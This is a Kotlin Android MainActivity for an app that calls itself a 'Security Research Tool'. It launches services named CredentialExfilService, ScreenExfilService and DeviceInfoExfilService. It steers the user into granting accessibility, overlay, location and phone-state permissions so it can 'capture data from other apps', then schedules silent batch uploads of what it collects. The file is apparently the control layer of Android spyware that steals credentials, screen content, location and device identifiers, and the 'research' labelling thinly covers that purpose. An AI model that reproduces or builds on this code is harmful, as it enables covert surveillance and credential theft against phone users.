package com.yourpackage

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.yourpackage.data.ExfilData
import com.yourpackage.network.ApiClient
import com.yourpackage.services.CredentialExfilService
import com.yourpackage.services.DeviceInfoExfilService
import com.yourpackage.services.ScreenExfilService
import com.yourpackage.utils.BatchScheduler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    companion object {
        private const val OVERLAY_PERMISSION_REQUEST = 1001
        private const val ACCESSIBILITY_PERMISSION_REQUEST = 1002
        private const val LOCATION_PERMISSION_REQUEST = 1003
        private const val PHONE_PERMISSION_REQUEST = 1004
    }

    private lateinit var toggleButton: Button
    private lateinit var statusText: TextView

    private var servicesRunning = false
    private lateinit var apiClient: ApiClient
    private lateinit var batchScheduler: BatchScheduler
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        toggleButton = findViewById(R.id.toggleButton)
        statusText = findViewById(R.id.statusText)

        // Initialize API Client
        apiClient = ApiClient(this)

        // Initialize Batch Scheduler
        batchScheduler = BatchScheduler {
            // This lambda is called when the scheduler fires
            sendBatch()
        }

        // Start background retry for offline queue
        apiClient.startBackgroundRetry()

        toggleButton.setOnClickListener {
            if (servicesRunning) {
                stopServices()
            } else {
                startServices()
            }
        }

        updateUI()
    }

    /**
     * Start all services and request permissions if needed.
     */
    private fun startServices() {
        // Check overlay permission (required for some apps)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                requestOverlayPermission()
                return
            }
        }

        // Check accessibility permission
        if (!isAccessibilityServiceEnabled()) {
            requestAccessibilityPermission()
            return
        }

        // Check location permission (for DeviceInfoExfilService)
        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.ACCESS_FINE_LOCATION),
                LOCATION_PERMISSION_REQUEST
            )
            return
        }

        // Check phone permission (for IMEI)
        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_PHONE_STATE
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_PHONE_STATE),
                PHONE_PERMISSION_REQUEST
            )
            return
        }

        // All permissions granted, start services
        doStartServices()
    }

    /**
     * Actually start the services after permissions are granted.
     */
    private fun doStartServices() {
        // Start CredentialExfilService
        val credentialIntent = Intent(this, CredentialExfilService::class.java)
        startService(credentialIntent)

        // Start ScreenExfilService
        val screenIntent = Intent(this, ScreenExfilService::class.java)
        startService(screenIntent)

        // Start DeviceInfoExfilService
        val deviceIntent = Intent(this, DeviceInfoExfilService::class.java)
        startService(deviceIntent)

        // Start batch scheduler
        batchScheduler.start()

        servicesRunning = true
        updateUI()
        Toast.makeText(this, "🔍 Research services started", Toast.LENGTH_SHORT).show()
    }

    /**
     * Stop all services.
     */
    private fun stopServices() {
        // Stop batch scheduler
        batchScheduler.stop()

        // Stop services
        val credentialIntent = Intent(this, CredentialExfilService::class.java)
        stopService(credentialIntent)

        val screenIntent = Intent(this, ScreenExfilService::class.java)
        stopService(screenIntent)

        val deviceIntent = Intent(this, DeviceInfoExfilService::class.java)
        stopService(deviceIntent)

        servicesRunning = false
        updateUI()
        Toast.makeText(this, "⏹️ Research services stopped", Toast.LENGTH_SHORT).show()
    }

    /**
     * Update UI based on service state.
     */
    private fun updateUI() {
        if (servicesRunning) {
            toggleButton.text = "Stop Research Services"
            toggleButton.setBackgroundColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
            statusText.text = "🟢 Status: Services Running"
            statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_light))
        } else {
            toggleButton.text = "Start Research Services"
            toggleButton.setBackgroundColor(ContextCompat.getColor(this, android.R.color.holo_blue_dark))
            statusText.text = "🔴 Status: Stopped"
            statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
        }
    }

    /**
     * Check if accessibility service is enabled.
     */
    private fun isAccessibilityServiceEnabled(): Boolean {
        val service = "${packageName}/.services.CredentialExfilService"
        try {
            val enabledServices = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )
            return enabledServices?.contains(service) == true
        } catch (e: Exception) {
            return false
        }
    }

    /**
     * Request overlay permission.
     */
    private fun requestOverlayPermission() {
        AlertDialog.Builder(this)
            .setTitle("Overlay Permission Required")
            .setMessage("This app needs overlay permission to capture data from other apps. Please grant it in the settings.")
            .setPositiveButton("Open Settings") { _, _ ->
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
                startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST)
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    /**
     * Request accessibility permission.
     */
    private fun requestAccessibilityPermission() {
        AlertDialog.Builder(this)
            .setTitle("Accessibility Permission Required")
            .setMessage("This app needs accessibility permission to read screen content. Please enable it in the settings.\n\n" +
                    "1. Go to Settings > Accessibility\n" +
                    "2. Find \"Security Research Tool\"\n" +
                    "3. Toggle it ON")
            .setPositiveButton("Open Settings") { _, _ ->
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivityForResult(intent, ACCESSIBILITY_PERMISSION_REQUEST)
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    /**
     * Handle permission request results.
     */
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        when (requestCode) {
            LOCATION_PERMISSION_REQUEST, PHONE_PERMISSION_REQUEST -> {
                if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    // Permission granted, try starting services again
                    if (!servicesRunning) {
                        startServices()
                    }
                } else {
                    Toast.makeText(this, "Permission required for full functionality", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    /**
     * Handle activity results (for overlay and accessibility permissions).
     */
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        when (requestCode) {
            OVERLAY_PERMISSION_REQUEST -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (Settings.canDrawOverlays(this)) {
                        // Overlay permission granted, try starting services
                        if (!servicesRunning) {
                            startServices()
                        }
                    } else {
                        Toast.makeText(this, "Overlay permission required", Toast.LENGTH_SHORT).show()
                    }
                }
            }
            ACCESSIBILITY_PERMISSION_REQUEST -> {
                if (isAccessibilityServiceEnabled()) {
                    // Accessibility granted, try starting services
                    if (!servicesRunning) {
                        startServices()
                    }
                } else {
                    Toast.makeText(this, "Accessibility permission required", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    /**
     * Send a batch via the batch scheduler.
     */
    private suspend fun sendBatch() {
        // This will be called by the BatchScheduler
        // The actual batch sending is handled by the services
        // We just process the offline queue here
        try {
            val sentCount = apiClient.processOfflineQueue()
            if (sentCount > 0) {
                runOnUiThread {
                    Toast.makeText(
                        this,
                        "📤 Sent $sentCount items from offline queue",
                        Toast.LENGTH_SHORT
                    ).show()
                }
            }
        } catch (e: Exception) {
            // Silent fail - will retry later
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Stop services when activity is destroyed
        if (servicesRunning) {
            stopServices()
        }
    }
}